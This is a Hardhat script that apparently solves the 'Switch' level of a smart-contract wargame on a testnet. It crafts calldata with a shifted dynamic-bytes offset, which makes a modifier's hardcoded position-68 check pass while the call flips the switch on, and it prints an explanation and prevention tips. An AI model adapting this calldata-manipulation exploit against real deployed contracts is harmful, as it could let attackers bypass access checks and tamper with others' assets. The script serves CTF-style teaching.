import { ethers } from "hardhat";

/**
 * Execute the Switch attack by crafting malicious calldata
 * 
 * Usage:
 * ATTACK_CONTRACT_ADDRESS=0xYourAttackAddress TARGET_ADDRESS=0xSwitchAddress npx hardhat run scripts/level-29-switch/attack.ts --network sepolia
 * 
 * Or use direct attack:
 * TARGET_ADDRESS=0xSwitchAddress npx hardhat run scripts/level-29-switch/attack.ts --network sepolia
 */
async function main() {
  console.log("Executing Switch attack with calldata manipulation...\n");
  
  // Get the addresses from environment
  const attackContractAddress = process.env.ATTACK_CONTRACT_ADDRESS;
  const targetAddress = process.env.TARGET_ADDRESS;
  
  if (!targetAddress) {
    throw new Error("Environment variable TARGET_ADDRESS must be set");
  }
  
  // Get the signer account
  const [signer] = await ethers.getSigners();
  console.log(`Using signer account: ${signer.address}`);
  
  try {
    // Connect to the Switch contract
    const switchContract = await ethers.getContractAt("Switch", targetAddress);
    
    console.log("=== Contract Addresses ===");
    console.log(`Switch: ${targetAddress}`);
    if (attackContractAddress) {
      console.log(`Attack Contract: ${attackContractAddress}`);
    }
    
    // Check initial state
    let switchOn = await switchContract.switchOn();
    const offSelector = await switchContract.offSelector();
    
    console.log("\n=== Initial State ===");
    console.log(`Switch On: ${switchOn}`);
    console.log(`Off Selector: ${offSelector}`);
    
    if (switchOn) {
      console.log("\n✓ Switch is already ON! No attack needed.");
      return;
    }
    
    // Method 1: Use attack contract if available
    if (attackContractAddress) {
      console.log("\n=== Method 1: Using Attack Contract ===");
      const attackContract = await ethers.getContractAt("SwitchAttack", attackContractAddress);
      
      console.log("Calling attackDirect() to flip the switch...");
      const tx = await attackContract.attackDirect();
      console.log("Transaction hash:", tx.hash);
      console.log("Waiting for confirmation...");
      
      await tx.wait();
      console.log("✓ Transaction confirmed");
      
    } else {
      // Method 2: Craft calldata manually and send directly
      console.log("\n=== Method 2: Direct Calldata Manipulation ===");
      console.log("Crafting malicious calldata...\n");
      
      // Get the function selectors
      const flipSwitchSelector = ethers.id("flipSwitch(bytes)").slice(0, 10); // 0x30c13ade
      const turnSwitchOnSelector = ethers.id("turnSwitchOn()").slice(0, 10);   // 0x76227e12
      const turnSwitchOffSelector = ethers.id("turnSwitchOff()").slice(0, 10); // 0x20606e15
      
      console.log("Function Selectors:");
      console.log(`  flipSwitch(bytes): ${flipSwitchSelector}`);
      console.log(`  turnSwitchOn(): ${turnSwitchOnSelector}`);
      console.log(`  turnSwitchOff(): ${turnSwitchOffSelector}`);
      
      console.log("\n📋 Calldata Structure:");
      console.log("┌──────────────┬─────────────────────────────────┬──────────────────────┐");
      console.log("│ Position     │ Value                           │ Description          │");
      console.log("├──────────────┼─────────────────────────────────┼──────────────────────┤");
      console.log("│ 0x00-0x03    │ 0x30c13ade                      │ flipSwitch selector  │");
      console.log("│ 0x04-0x23    │ 0x0000...0060                   │ Offset = 96 (!)      │");
      console.log("│ 0x24-0x43    │ 0x0000...0000                   │ Dummy padding        │");
      console.log("│ 0x44-0x47    │ 0x20606e15                      │ turnSwitchOff (pos68)│");
      console.log("│ 0x48-0x63    │ 0x0000...0000                   │ More padding         │");
      console.log("│ 0x64-0x83    │ 0x0000...0004                   │ Length = 4 bytes     │");
      console.log("│ 0x84-0x87    │ 0x76227e12                      │ turnSwitchOn (pos96) │");
      console.log("└──────────────┴─────────────────────────────────┴──────────────────────┘");
      
      // Construct the malicious calldata
      const maliciousCalldata = ethers.concat([
        flipSwitchSelector,                                           // 0x00-0x03: flipSwitch selector
        ethers.zeroPadValue(ethers.toBeHex(0x60), 32),               // 0x04-0x23: offset = 96
        ethers.zeroPadValue("0x00", 32),                             // 0x24-0x43: dummy data
        turnSwitchOffSelector,                                        // 0x44-0x47: turnSwitchOff at pos 68!
        ethers.zeroPadValue("0x00", 28),                             // 0x48-0x63: padding
        ethers.zeroPadValue(ethers.toBeHex(0x04), 32),               // 0x64-0x83: length = 4
        turnSwitchOnSelector                                          // 0x84-0x87: turnSwitchOn at pos 96!
      ]);
      
      console.log("\n🔧 Crafted Calldata:");
      console.log(maliciousCalldata);
      console.log(`\nLength: ${ethers.dataLength(maliciousCalldata)} bytes`);
      
      console.log("\n🎯 Attack Explanation:");
      console.log("1. The onlyOff modifier reads position 68 (offset 0x44)");
      console.log("2. At position 68, it finds turnSwitchOff selector (0x20606e15)");
      console.log("3. The modifier check PASSES ✓");
      console.log("4. But flipSwitch reads _data from the offset specified at position 0x04");
      console.log("5. Our offset is 0x60 (96), not the normal 0x20 (32)");
      console.log("6. At position 96, the actual data is turnSwitchOn selector");
      console.log("7. So flipSwitch calls turnSwitchOn() instead of turnSwitchOff()!");
      console.log("8. The switch gets turned ON! 💡\n");
      
      console.log("Sending crafted calldata to Switch contract...");
      const tx = await signer.sendTransaction({
        to: targetAddress,
        data: maliciousCalldata
      });
      
      console.log("Transaction hash:", tx.hash);
      console.log("Waiting for confirmation...");
      
      await tx.wait();
      console.log("✓ Transaction confirmed");
    }
    
    // Check final state
    switchOn = await switchContract.switchOn();
    
    console.log("\n=== Final State ===");
    console.log(`Switch On: ${switchOn}`);
    
    if (switchOn) {
      console.log("\n✅ SUCCESS! The switch is now ON!");
      console.log("🎉 You've successfully exploited the calldata manipulation vulnerability!");
      
      console.log("\n📚 What we learned:");
      console.log("1. CALLDATA ENCODING: Understanding how dynamic types are encoded");
      console.log("   - Function selector (4 bytes)");
      console.log("   - Offset to data location (32 bytes)");
      console.log("   - Data length and contents at the offset");
      
      console.log("\n2. HARDCODED OFFSETS ARE DANGEROUS:");
      console.log("   - The modifier checked position 68 assuming standard encoding");
      console.log("   - We manipulated the offset to change what's at position 68");
      console.log("   - While keeping the actual data elsewhere");
      
      console.log("\n3. ASSEMBLY CALLDATACOPY RISKS:");
      console.log("   - Direct calldata access bypasses Solidity's type safety");
      console.log("   - Hardcoded positions assume specific encoding");
      console.log("   - Can be manipulated by crafting non-standard calldata");
      
      console.log("\n🔒 Prevention:");
      console.log("- Don't use hardcoded calldata positions");
      console.log("- Validate the entire calldata structure, not just parts");
      console.log("- Use Solidity's type system instead of assembly when possible");
      console.log("- If using assembly, validate all offsets and lengths");
      console.log("- Consider using function selectors directly instead of checking calldata");
      
    } else {
      console.log("\n❌ Attack failed! The switch is still OFF.");
      console.log("\nPossible issues:");
      console.log("- Calldata may not be constructed correctly");
      console.log("- Check that selectors are correct");
      console.log("- Verify the offset calculation");
    }
    
  } catch (error: any) {
    console.error("\n❌ Error executing attack:");
    if (error.message) {
      console.error("Error message:", error.message);
    }
    if (error.reason) {
      console.error("Reason:", error.reason);
    }
    if (error.data) {
      console.error("Error data:", error.data);
    }
    throw error;
  }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
